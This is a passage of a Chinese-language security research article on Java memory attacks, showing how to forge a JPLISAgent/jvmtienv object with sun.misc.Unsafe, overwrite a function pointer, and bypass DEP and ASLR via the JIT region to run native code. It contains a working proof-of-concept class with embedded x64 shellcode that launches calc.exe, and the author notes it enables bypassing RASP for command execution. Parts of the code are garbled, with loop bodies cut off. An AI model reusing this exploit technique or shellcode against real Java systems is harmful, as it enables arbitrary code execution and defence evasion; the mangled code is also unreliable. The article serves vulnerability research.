    package net.rebeyond;
    public class Bird {    public void sayHello()    {        System.out.println("hello!");    }}
编译，运行：
上述环境是win10+Jdk1.8.0_301_x64，注释中内置了linux+jdk1.8.0_301_x64和win10+Jdk1.8.0_271_x64指纹，如果是其他OS或者JDK版本，指纹库需要对应更新。
可以看到，我们成功通过纯Java代码实现了动态修改类字节码。
按照惯例，我提出一种新的技术理论的时候，一般会直接给出一个下载即可用的exp，但是现在为了合规起见，此处只给出demo，不再提供完整的利用工具。
## Java跨平台任意Native代码执行
## 确定入口
上文中，我们介绍了在Windows平台下巧妙利用instrument的不恰当实现来进行进程注入的技术，当注入的目标进行为-1时，可以往当前Java进程注入shellcode，实现不依赖JNI执行任意Native代码。但是这个方法仅适用于Windows平台。只适用于Windows平台的技术是不完整的：）
上一小节我们在伪造JPLISAgent对象的时候，留意到redefineClasses函数里面有这种代码：
allocate函数的第一个参数是jvmtienv指针，我们跟进allocate函数：
    void *allocate(jvmtiEnv * jvmtienv, size_t bytecount) {    void *          resultBuffer    = NULL;    jvmtiError      error           = JVMTI_ERROR_NONE;
        error = (*jvmtienv)->Allocate(jvmtienv,                                bytecount,                                (unsigned char**) &resultBuffer);    /* may be called from any phase */    jplis_assert(error == JVMTI_ERROR_NONE);    if ( error != JVMTI_ERROR_NONE ) {        resultBuffer = NULL;    }    return resultBuffer;}
可以看到最终是调用的jvmtienv对象的一个成员函数，先看一下真实的jvmtienv是什么样子：
对象里是很多函数指针，看到这里，如果你经常分析二进制漏洞的话，可能会马上想到这里jvmtienv是我们完全可控的，我们只要在伪造的jvmtienv对象指定的偏移位置覆盖这个函数指针即可实现任意代码执行。
构造如下POC：
先动态调试看一下我们布局的payload：
0x219d1b1a810为我们通过unsafe.allocateMemory分配内存的首地址，我们从这里开始布局JPLISAgent对象，0x219d1b1a818处的值0x219d1b1a820是指向jvmtienv的指针，跟进0x219d1b1a820，其值为指向真实的jvmtienv对象的指针，这里我们把他指向了他自己0x219d1b1a820，接下来我们就可以在0x219d1b1a820处布置最终的jvmtienv对象了。根据动态调试得知allocate函数指针在jvmtienv对象的偏移量为0x168，我们只要覆盖0x219d1b1a820+0x168（0x219d1b1a988）的值为我们shellcode的地址即可将RIP引入shellcode。此处我们把0x219d1b1a988处的值设置为0x219d1b1a990，紧跟在0x219d1b1a988的后面，然后往0x219d1b1a990写入shellcode。
编译，运行：
进程crash了，报的异常是意料之中，仔细看下报的异常：
    #EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x00000219d1b1a990, pid=24840, tid=0x0000000000005bfc
内存访问异常，但是pc的值是0x00000219d1b1a990，这就是我们shellcode的首地址。说明我们的payload布置是正确的，只不过系统开启了NX（DEP），导致我们没办法去执行shellcode，下图是异常的现场，可见RIP已经到了shellcode：
### 绕过NX(DEP)
上文的POC中我们已经可以劫持RIP,但是我们的shellcode部署在堆上，不方便通过ROP关闭DEP。那能不能找一块rwx的内存呢？熟悉浏览器漏洞挖掘的朋友都知道JIT区域天生RWE，而Java也是有JIT特性的，通过分析进程内存布局，可以看到Java进程确实也存在这样一个区域，如下图：
我们只要通过unsafe把shellcode写入这个区域即可。但是，还有ASLR，需要绕过ASLR才能获取到这块JIT区域。
## 绕过ASLR
在前面我们已经提到了一种通过匹配指针指纹绕过ASLR的方法，这个方法在这里同样适用。不过，这里我想换一种方法，因为通过指纹匹配的方式，需要针对不同的Java版本做适配，还是比较麻烦的。这里采用了搜索内存的方法，如下：
    package net.rebeyond;
    import sun.misc.Unsafe;
    import java.lang.instrument.ClassDefinition;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;
    public class PocForRCE {    public static void main(String [] args) throws Throwable {
            byte buf[] = new byte[]                {                        (byte) 0x41, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,                        (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,                        (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,                        (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,                        (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,                        (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,                        (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,                        (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,                        (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,                        (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,                        (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,                        (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,                        (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,                        (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,                        (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,                        (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,                        (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,                        (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,                        (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,                        (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,                        (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,                        (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,                        (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,                        (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,                        (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,                        (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,                        (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,                        (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,                        (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,                        (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,                        (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,                        (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,                        (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,                        (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,                        (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00                };
            Unsafe unsafe = null;
            try {            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");            field.setAccessible(true);            unsafe = (sun.misc.Unsafe) field.get(null);        } catch (Exception e) {            throw new AssertionError(e);        }
            long size = buf.length+0x178; // a long is 64 bits (http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)        long allocateMemory = unsafe.allocateMemory(size);        System.out.println("allocateMemory:"+Long.toHexString(allocateMemory));
            Map map=new HashMap();        map.put("X","y");        //unsafe.putObject(map,allocateMemory+0x10,ints);        //unsafe.putByte(allocateMemory,);        PocForRCE poc=new PocForRCE();        for (int i=0;i0)            {                continue;            }            if (target>(allocateMemory&0xffffffff00000000l)&&target0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))                {                    System.out.println("maybe error address,skip "+Long.toHexString(target));                    continue;                }                System.out.println("BYTE:"+unsafe.getByte(target));                //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));                if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48||unsafe.getByte(target)==(byte)0x66)                {                    System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));                    shellcodeBed=target;                    break;                }
                }
            }
            if (shellcodeBed==0)        {            for (int j=-0x100;j0)                {                    continue;                }                if (target>(allocateMemory&0xffffffff00000000l)&&target0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))                    {                        System.out.println("maybe error address,skip "+Long.toHexString(target));                        continue;                    }                    System.out.println("BYTE:"+unsafe.getByte(target));                    //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));                    if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48)                    {                        System.out.println("get bigger cache address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));                        shellcodeBed=target;                        break;                    }
                    }
                }        }        System.out.println("find address end,address is "+Long.toHexString(shellcodeBed)+" mod 8 is:"+shellcodeBed%8);
            String address="";
            allocateMemory=shellcodeBed;        address=allocateMemory+"";        Class cls=Class.forName("sun.instrument.InstrumentationImpl");
            Constructor constructor=cls.getDeclaredConstructors()[0];        constructor.setAccessible(true);        Object obj=constructor.newInstance(Long.parseLong(address),true,true);        Method redefineMethod=cls.getMethod("redefineClasses",new Class[]{ClassDefinition[].class});        ClassDefinition classDefinition=new ClassDefinition(                Class.class,                new byte[]{});        ClassDefinition[] classDefinitions=new ClassDefinition[]{classDefinition};        try        {            unsafe.putLong(allocateMemory+8,allocateMemory+0x10);  //set **jvmtienv point to it's next memory region            unsafe.putLong(allocateMemory+8+8,allocateMemory+0x10); //set *jvmtienv point to itself            unsafe.putLong(allocateMemory+0x10+0x168,allocateMemory+0x10+0x168+8); //overwrite allocate function pointer  to allocateMemory+0x10+0x168+8            for (int k=0;k1)        {            // System.out.println("x>1");        }        else        {            // System.out.println("x1)        {            //System.out.println("x>1");            this.a(x);        }        else        {            this.a(x+4);            // System.out.println("x<=1");        }    }}
编译，运行，成功执行了shellcode，弹出计算器。
到此，我们通过纯Java代码实现了跨平台的任意Native代码执行，从而可以解锁很多新玩法，比如绕过RASP实现命令执行、文件读写、数据库连接等等。
## 小结
本文主要介绍了几种我最近研究的内存相关的攻击方法，欢迎大家交流探讨，文中使用的测试环境为Win10_x64、Ubuntu16.04_x64、Java
1.8.0_301_x64、Java 1.8.0_271_x64。由于文章拖得比较久了，所以行文略有仓促，若有纰漏之处，欢迎批评指正。
* * *